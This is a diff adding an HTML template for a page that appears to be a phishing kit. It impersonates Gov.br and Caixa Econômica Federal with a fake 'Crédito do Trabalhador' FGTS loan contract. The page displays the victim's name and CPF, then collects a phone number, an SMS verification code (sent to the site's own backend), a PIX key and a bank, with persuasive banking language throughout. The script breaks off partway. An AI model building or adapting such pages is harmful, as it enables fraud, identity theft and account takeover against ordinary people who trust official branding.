@@ -1,0 +1,1287 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "qs9me5web3"); </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>CONTRATO DE EMPRÉSTIMO - CAIXA</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+        }
+        h3, h4 {
+            font-size: 18px;
+            line-height: 1.05;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 100px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #1351b4;
+        }
+        .hero-image {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 15px 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            padding: 15px;
+            border-radius: 4px;
+            width: 100%;
+        }
+        .user-info:first-of-type {
+            margin-bottom: 30px;
+        }
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            width: 100%;
+        }
+        .user-info p {
+            margin: 1px 0;
+            color: #333333;
+            font-size: 16px;
+        }
+        .user-info p strong {
+            font-weight: 600;
+        }
+        .user-info h3 {
+            font-weight: 700;
+            color: #0c326f;
+            margin-bottom: 4px;
+        }
+        .user-info-image {
+            width: 50px;
+            height: auto;
+            justify-self: end;
+            align-self: start;
+            margin-left: 10px;
+            filter: drop-shadow(0px 2px 3px rgba(0, 0, 0, 0.2));
+        }
+        /* Aumentando o espaçamento após os dados do contribuinte */
+        .user-info:nth-of-type(2) .user-info-content {
+            margin-bottom: 35px;
+            padding-bottom: 15px;
+        }
+        .message-box {
+            background-color: #185D9D;
+            border: 1px solid #0c4a8c;
+            color: white;
+            padding: 15px;
+            margin-top: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+        .message-box p {
+            margin-bottom: 8px;
+            width: 100%;
+            font-size: 16px;
+            line-height: 1.45;
+        }
+        .message-box strong {
+            font-weight: 700;
+        }
+        .message-box .red-strong {
+            color: #F85900;
+            font-weight: 700;
+        }
+        .tax-details {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+        .tax-details::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            background-image: url('');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            opacity: 0.05;
+            z-index: 0;
+        }
+        .tax-details > * {
+            position: relative;
+            z-index: 1;
+        }
+        .tax-details h4 {
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #0c326f;
+            line-height: 1.45;
+        }
+        .tax-details .document-data {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* Two columns */
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .tax-details .document-data dt {
+            font-weight: 600;
+            text-align: right;
+            padding: 8px 15px;
+            background-color: rgba(248, 249, 250, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            min-width: 80px;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+        .tax-details .document-data dd {
+            font-weight: normal;
+            padding: 8px 15px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            margin-left: 0;
+            white-space: normal;
+            word-wrap: break-word;
+            overflow-x: auto;
+        }
+        .tax-details .document-data dt,
+        .tax-details .document-data dd {
+            display: flex;
+            align-items: center;
+        }
+        .tax-details .total-value {
+            font-size: 20px;
+            line-height: 1.45;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .regularize-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1351b4 !important;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .regularize-button:hover {
+            background-color: #003366 !important;
+            transform: translateY(-2px);
+        }
+        .news-image {
+            width: 100%;
+            height: auto;
+            margin: 8px auto 0;
+            display: block;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .news-description {
+            color: #333;
+            margin-top: 12px;
+            padding: 0 4px;
+            text-align: justify;
+            width: 100%;
+        }
+        .footer {
+            background-color: #1351b4;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        @media (max-width: 600px) {
+            .header {
+                padding: 6px 8px;
+            }
+            .logo {
+                width: 100px;
+            }
+            .header-icons {
+                gap: 8px;
+            }
+            .header-icon {
+                font-size: 16px;
+            }
+            .message-box {
+                width: 100%;
+            }
+            .news-image {
+                max-width: 100%;
+            }
+            .news-description {
+                margin-left: 0;
+            }
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background-color: white;
+            width: 95%;
+            max-width: 500px;
+            position: absolute;
+            top: 50%;
+            left: 47%;
+            transform: translate(-50%, -50%);
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-header {
+            text-align: left;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .modal-logo {
+            width: 100px;
+            height: auto;
+            margin: 0;
+            display: block;
+        }
+
+        /* QR Code Container */
+        .qr-code-container {
+            text-align: left;
+            padding: 15px 0;
+        }
+
+        .qr-code-img {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 15px;
+        }
+
+        .customer-info {
+            background-color: #f8f9fa;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            border-left: 4px solid #0c326f;
+            text-align: left;
+        }
+
+        .customer-info p {
+            margin: 3px 0;
+            color: #333;
+            text-align: left;
+        }
+
+        .customer-info .total-amount {
+            color: #dc3545;
+            font-weight: 700;
+            margin-top: 8px;
+            font-size: 16px;
+        }
+
+        .warning-text {
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 12px;
+            border-radius: 4px;
+            margin: 12px 0 0 0;
+            font-weight: 500;
+        }
+
+
+        .pix-code-container {
+            background-color: #fff;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 8px;
+            margin: 12px 0;
+        }
+
+        .pix-code {
+            font-family: monospace;
+            word-break: break-all;
+            margin: 0;
+            padding: 8px;
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .copy-button-container {
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        .copy-pix-button {
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            width: 80%;
+            justify-content: center;
+        }
+
+        .copy-pix-button:hover {
+            background-color: #092555;
+        }
+
+        /* Modal no mobile */
+        @media (max-width: 600px) {
+            .modal-content {
+                margin: 40px 15px;
+                padding: 20px;
+            }
+        }
+
+        /* Script JavaScript adicional para o cronômetro */
+        @keyframes copy-feedback {
+            0% { background-color: #0c326f; }
+            50% { background-color: #28a745; }
+            100% { background-color: #0c326f; }
+        }
+
+        .copy-success {
+            animation: copy-feedback 1s ease;
+        }
+
+        /* Loader Animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-container {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(12, 50, 111, 0.1);
+            border-radius: 50%;
+            border-top-color: #0c326f;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loader-text {
+            color: #0c326f;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+
+        .banco-central-termo {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #0c326f;
+        }
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+        }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: #1351b4;
+        }
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        .switch-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 8px;
+            margin: 15px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #dc35451a;
+        }
+        .switch-container.shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        .term-title {
+            font-weight: 600;
+            color: #0c326f;
+            margin-bottom: 15px;
+            text-align: left;
+            font-size: 18px;
+        }
+        .term-content {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .term-content p {
+            margin-bottom: 15px;
+            padding-right: 10px;
+        }
+        .term-list {
+            list-style: disc;
+            margin-left: 25px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .term-list li {
+            margin-bottom: 6px;
+        }
+        /* Modal de Pagamento */
+        #paymentModal .modal-header {
+            text-align: left;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        #paymentModal .modal-logo {
+            width: 100px;
+            height: auto;
+            margin: 0;
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+
+        /*Removed @keyframes pulse*/
+
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img alt="Logo Gov.br" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="hero-image">
+        <img alt="Aviso sobre novas regras do PIX" src="https://www.gov.br/trabalho-e-emprego/pt-br/imagens-capa/banner-credito-do-trabalhador-site-mte.png">
+    </div>
+
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3 style="text-align: center;">CONTRATO DE EMPRÉSTIMO - CAIXA</h3>
+                <div style="margin-top: 15px; line-height: 1.6;">
+                    <p>A <strong>CAIXA</strong>, no uso de suas atribuições legais, com fundamento na <strong>Lei nº 14.436/2025</strong>, que institui o <strong>Programa Crédito do Trabalhador</strong>, disponibiliza ao cidadão <strong data-user="nome">{{ customer.nome }}</strong>, portador do CPF <strong data-user="cpf">{{ customer.cpf }}</strong>, a contratação de empréstimo com desconto direto no FGTS, sem comprometer sua renda mensal, e sem consulta ao SPC/Serasa.</p>
+
+                    <p>O <strong>Programa Crédito do Trabalhador</strong> é uma iniciativa que visa facilitar o acesso ao crédito de forma segura e com baixas taxas de juros para trabalhadores brasileiros, utilizando como garantia valores provenientes do Fundo de Garantia por Tempo de Serviço (FGTS).</p>
+
+                    <p style="margin-top: 15px;">Brasília, {{ '21/03/2025' }}</p>
+                    <p><strong>CAIXA ECONÔMICA FEDERAL</strong></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="user-info">
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>DADOS DO DEVEDOR</h3>
+                    <p><strong>NOME:</strong> <span data-user="nome">{{ customer.nome }}</span></p>
+                    <p><strong>CPF:</strong> <strong data-user="cpf">{{ customer.cpf }}</strong></p>
+                </div>
+                <img src="https://www.freepnglogos.com/uploads/logo-caixa-png/caixa-download-png-5.png" alt="User profile icon" class="user-info-image">
+            </div>
+            <div class="message-box">
+                <p><span class="red-strong">Atenção: </span><span style="color: white; font-weight: bold;">Sua chave PIX para receber o valor do empréstimo precisa estar cadastrada numa conta bancária de qualquer banco de sua titularidade. O valor do empréstimo será depositado imediatamente após você concluir o processo de verificação.</span></p>
+            </div>
+            <div class="tax-details">
+                <h4>CONTRATO DE EMPRÉSTIMO - CAIXA</h4>
+                <dl class="document-data">
+                    <dt>Valor Contratado:</dt>
+                    <dd>
+                        <strong style="font-size: 16px;" id="loanAmount">R$ 0,00</strong>
+                    </dd>
+                
+                    <dt>Parcela Mensal:</dt>
+                    <dd>
+                        <strong style="font-size: 16px;" id="monthlyPayment">R$ 0,00</strong>
+                    </dd>
+                    <dt>Taxa de Juros:</dt>
+                    <dd>
+                        <strong style="font-size: 16px;">1,9% ao mês</strong>
+                    </dd>
+                    <dt>Prazo Total:</dt>
+                    <dd>
+                        <strong style="font-size: 16px;" id="loanTerm">0 meses</strong>
+                    </dd>
+                </dl>
+                
+                <div style="background-color: #185D9D; padding: 15px; margin: 15px 0; border-radius: 4px; line-height: 1.4; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">
+                    <p style="margin-bottom: 10px; font-weight: 600; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">Informações do empréstimo:</p>
+                    <p style="color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">• Desconto direto no FGTS todo dia 10 de cada mês</p>
+                    <p style="color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">• Sem comprometer seu salário mensal</p>
+                    <p style="color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">• Sem consulta ao SPC/Serasa</p>
+                    <p style="color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">• O valor será creditado via PIX na conta de sua escolha</p>
+                    <p style="margin-top: 10px; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">Este contrato é regido pela Lei nº 14.436, de 21 de março
+                </div>
+
+                <div class="verification-section" style="margin-top: 25px; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px;">
+                    <h4 style="color: #000000; margin-bottom: 15px; font-size: 18px; font-weight: 700;">Confirme seu Número de Telefone</h4>
+                    <p style="margin-bottom: 15px;">Para finalizar o contrato e receber o valor, confirme seu telefone para receber um código de segurança em sua Caixa de SMS:</p>
+                    
+                    <div id="phoneInputSection">
+                        <div style="display: flex; margin-bottom: 15px;">
+                            <input type="tel" id="phoneInput" style="flex: 1; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 16px;" placeholder="(XX) XXXXX-XXXX" maxlength="15">
+                        </div>
+                        <button id="requestCodeButton" class="regularize-button" style="margin-top: 0;">
+                            <i class="fas fa-sms"></i>
+                            Receber meu código
+                        </button>
+                    </div>
+
+                    <div id="codeInputSection" style="display: none; margin-top: 20px;">
+                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                            <input type="text" id="codeInput" style="flex: 1; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 18px; letter-spacing: 2px; text-align: center;" placeholder="Digite o código de 4 dígitos" maxlength="4">
+                        </div>
+                        <button id="confirmCodeButton" class="regularize-button" style="margin-top: 0;">
+                            <i class="fas fa-check-circle"></i>
+                            Confirmar Código
+                        </button>
+                    </div>
+
+                    <div id="verifiedPhoneSection" style="display: none; margin-top: 20px;">
+                        <div style="display: flex; align-items: center; background-color: #f0f8ff; padding: 15px; border-radius: 8px; border-left: 4px solid #1351b4;">
+                            <i class="fas fa-check-circle" style="font-size: 24px; color: #1351b4; margin-right: 15px;"></i>
+                            <div>
+                                <p style="font-weight: 700; margin-bottom: 5px;">Telefone verificado com sucesso!</p>
+                                <p id="verifiedPhone" style="color: #666;"></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="pixKeySection" style="display: none; margin-top: 25px; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; text-align: center;">
+                    <div style="margin-bottom: 15px;">
+                        <img src="https://img.icons8.com/color/512/pix.png" alt="Logo PIX" style="width: 50px; height: 50px; margin: 0 auto;">
+                    </div>
+                    <h4 style="color: #005da8; margin-bottom: 15px; font-size: 20px; font-weight: 700;">Informe sua Chave PIX</h4>
+                    <p style="margin-bottom: 15px; text-align: left;">Selecione o tipo de chave PIX para receber o valor do empréstimo:</p>
+                    
+                    <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">
+                        <button class="pix-type-button selected" data-type="cpf" style="flex: 1; min-width: 100px; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                            <i class="fas fa-id-card"></i> CPF
+                        </button>
+                        <button class="pix-type-button" data-type="phone" style="flex: 1; min-width: 100px; padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                            <i class="fas fa-phone"></i> Telefone
+                        </button>
+                        <button class="pix-type-button" data-type="email" style="flex: 1; min-width: 100px; padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                            <i class="fas fa-envelope"></i> Email
+                        </button>
+                        <button class="pix-type-button" data-type="random" style="flex: 1; min-width: 100px; padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                            <i class="fas fa-random"></i> Aleatória
+                        </button>
+                    </div>
+                    <script>
+                        document.addEventListener('DOMContentLoaded', function() {
+                            const pixKeyInput = document.getElementById('pixKeyInput');
+                            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                            pixKeyInput.value = userData.cpf || '';
+                            
+                            // Função para atualizar o tipo de chave PIX selecionado
+                            function updateSelectedPixType(type) {
+                                // Limpa a seleção visual anterior
+                                document.querySelectorAll('.pix-type-button').forEach(btn => {
+                                    btn.style.backgroundColor = '#e9ecef';
+                                    btn.style.color = '#333';
+                                });
+                                
+                                // Destaca o botão clicado
+                                const selectedButton = document.querySelector(`.pix-type-button[data-type="${type}"]`);
+                                if (selectedButton) {
+                                    selectedButton.style.backgroundColor = '#1351b4';
+                                    selectedButton.style.color = 'white';
+                                }
+                                
+                                // Armazena o tipo escolhido
+                                localStorage.setItem('pixKeyType', type);
+                                
+                                // Também vamos armazenar o texto para exibição
+                                let pixKeyTypeText;
+                                switch(type) {
+                                    case 'cpf':
+                                        pixKeyTypeText = 'CPF';
+                                        pixKeyInput.value = userData.cpf || '';
+                                        break;
+                                    case 'phone':
+                                        pixKeyTypeText = 'Telefone';
+                                        pixKeyInput.value = userData.phone || '';
+                                        break;
+                                    case 'email':
+                                        pixKeyTypeText = 'Email';
+                                        pixKeyInput.value = '';
+                                        break;
+                                    case 'random':
+                                        pixKeyTypeText = 'Chave Aleatória';
+                                        pixKeyInput.value = '';
+                                        break;
+                                    default:
+                                        pixKeyTypeText = 'CPF';
+                                        pixKeyInput.value = userData.cpf || '';
+                                }
+                                localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
+                                console.log(`Tipo de chave PIX selecionado: ${type} (${pixKeyTypeText})`);
+                            }
+                            
+                            // Adiciona evento de clique aos botões de tipo de chave PIX
+                            document.querySelectorAll('.pix-type-button').forEach(button => {
+                                button.addEventListener('click', function() {
+                                    const type = this.getAttribute('data-type');
+                                    updateSelectedPixType(type);
+                                });
+                            });
+                            
+                            // Inicializa com CPF como padrão, independente do que está salvo
+                            // Isso garante que o tipo CPF sempre é a escolha padrão
+                            localStorage.setItem('pixKeyType', 'cpf');
+                            localStorage.setItem('pixKeyTypeText', 'CPF');
+                            updateSelectedPixType('cpf');
+                        });
+                    </script>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <input type="text" id="pixKeyInput" style="width: 100%; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 16px;" placeholder="Digite sua chave PIX">
+                    </div>
+                    
+                    <p style="margin-bottom: 15px; text-align: left;">Selecione o banco da sua chave PIX:</p>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px;">
+                        <button class="bank-button" data-bank="Caixa" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Caixa Econômica</button>
+                        <button class="bank-button" data-bank="Banco do Brasil" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Banco do Brasil</button>
+                        <button class="bank-button" data-bank="Bradesco" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Bradesco</button>
+                        <button class="bank-button" data-bank="Itau" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Itaú Unibanco</button>
+                        <button class="bank-button" data-bank="Santander" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Santander</button>
+                        <button class="bank-button" data-bank="Nubank" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Nubank</button>
+                        <button class="bank-button" data-bank="Inter" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">Banco Inter</button>
+                        <button class="bank-button" data-bank="C6" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">C6 Bank</button>
+                        <button class="bank-button" data-bank="PagBank" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">PagBank</button>
+                        <button class="bank-button" data-bank="BTG" style="padding: 10px; background-color: #e9ecef; color: #333; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; text-align: center;">BTG Pactual</button>
+                    </div>
+                    
+                    <button id="receiveMoneyButton" class="regularize-button" style="margin-top: 0; opacity: 0.5; cursor: not-allowed;" disabled>
+                        Receber agora
+                    </button>
+                </div>
+                
+                <div id="codeVerificationModal" class="modal" style="display: none;">
+                    <div class="modal-content" style="max-width: 400px;">
+                        <h4 style="text-align: center; color: #1351b4; margin-bottom: 20px;">Código de Verificação</h4>
+                        <p style="text-align: center; margin-bottom: 20px;">Digite o código de 4 dígitos enviado para seu telefone:</p>
+                        
+                        <div style="display: flex; justify-content: center; margin-bottom: 25px;">
+                            <input type="text" id="modalCodeInput" style="width: 200px; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 24px; letter-spacing: 5px; text-align: center;" placeholder="0000" maxlength="4">
+                        </div>
+                        
+                        <button id="modalConfirmCodeButton" class="regularize-button" style="margin-top: 0;">
+                            <i class="fas fa-check-circle"></i>
+                            Confirmar Código
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    <footer class="footer">
+        <p>© Todos os direitos reservados.</p>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get user data from localStorage
+            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":""}');
+            console.log('Loading from localStorage:', userData);
+
+            // Definir valores padrão para o empréstimo
+            const defaultLoanAmount = "10000";
+            const defaultMonthlyPayment = "345";
+            const defaultTerm = "36";
+            
+            // Check for selected loan amount in localStorage
+            const loanData = JSON.parse(localStorage.getItem('loanData') || `{"amount":"${defaultLoanAmount}","monthly":"${defaultMonthlyPayment}","term":"${defaultTerm}"}`);
+            
+            // Garante que os valores do empréstimo sejam salvos no localStorage
+            const saveLoanData = () => {
+                localStorage.setItem('loanData', JSON.stringify({
+                    amount: loanData.amount || defaultLoanAmount,
+                    monthly: loanData.monthly || defaultMonthlyPayment,
+                    term: loanData.term || defaultTerm
+                }));
+                console.log('Dados do empréstimo salvos:', loanData);
+            };
+            
+            // Salva os dados de empréstimo se não estiverem presentes
+            if (!localStorage.getItem('loanData')) {
+                saveLoanData();
+            }
+            
+            // Update loan amounts
+            document.getElementById('loanAmount').textContent = loanData.amount ? `R$ ${Number(loanData.amount).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2})}` : 'R$ 0,00';
+            document.getElementById('monthlyPayment').textContent = loanData.monthly ? `R$ ${Number(loanData.monthly).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2})}` : 'R$ 0,00';
+            document.getElementById('loanTerm').textContent = loanData.term ? `${loanData.term} meses` : '0 meses';
+
+            // Update all elements with data-user="nome"
+            document.querySelectorAll('[data-user="nome"]').forEach(element => {
+                element.textContent = userData.nome;
+            });
+
+            // Update all elements with data-user="cpf"
+            document.querySelectorAll('[data-user="cpf"]').forEach(element => {
+                element.textContent = userData.cpf;
+            });
+
+            // Phone verification section
+            const phoneInput = document.getElementById('phoneInput');
+            const requestCodeButton = document.getElementById('requestCodeButton');
+            const codeInputSection = document.getElementById('codeInputSection');
+            const phoneInputSection = document.getElementById('phoneInputSection');
+            const verifiedPhoneSection = document.getElementById('verifiedPhoneSection');
+            const pixKeySection = document.getElementById('pixKeySection');
+            const codeInput = document.getElementById('codeInput');
+            const confirmCodeButton = document.getElementById('confirmCodeButton');
+            const verifiedPhone = document.getElementById('verifiedPhone');
+            
+            // Phone input formatting
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) {
+                    value = value.slice(0, 11);
+                }
+                
+                if (value.length > 0) {
+                    value = '(' + value;
+                }
+                if (value.length > 3) {
+                    value = value.slice(0, 3) + ') ' + value.slice(3);
+                }
+                if (value.length > 10) {
+                    value = value.slice(0, 10) + '-' + value.slice(10);
+                }
+                
+                e.target.value = value;
+            });
+            
+            // Armazenar código de verificação recebido
+            let currentVerificationCode = null;
+            
+            // Request code button
+            requestCodeButton.addEventListener('click', function() {
+                const phone = phoneInput.value.replace(/\D/g, '');
+                
+                if (phone.length < 10) {
+                    alert('Por favor, digite um número de telefone válido.');
+                    return;
+                }
+                
+                // Disable button and show loading state
+                this.disabled = true;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando código...';
+                
+                // Make API request to send verification code
+                fetch('/send-verification-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phone }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        // Show code input section
+                        phoneInputSection.style.display = 'none';
+                        codeInputSection.style.display = 'block';
+                        
+                        // Store phone number in localStorage
+                        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
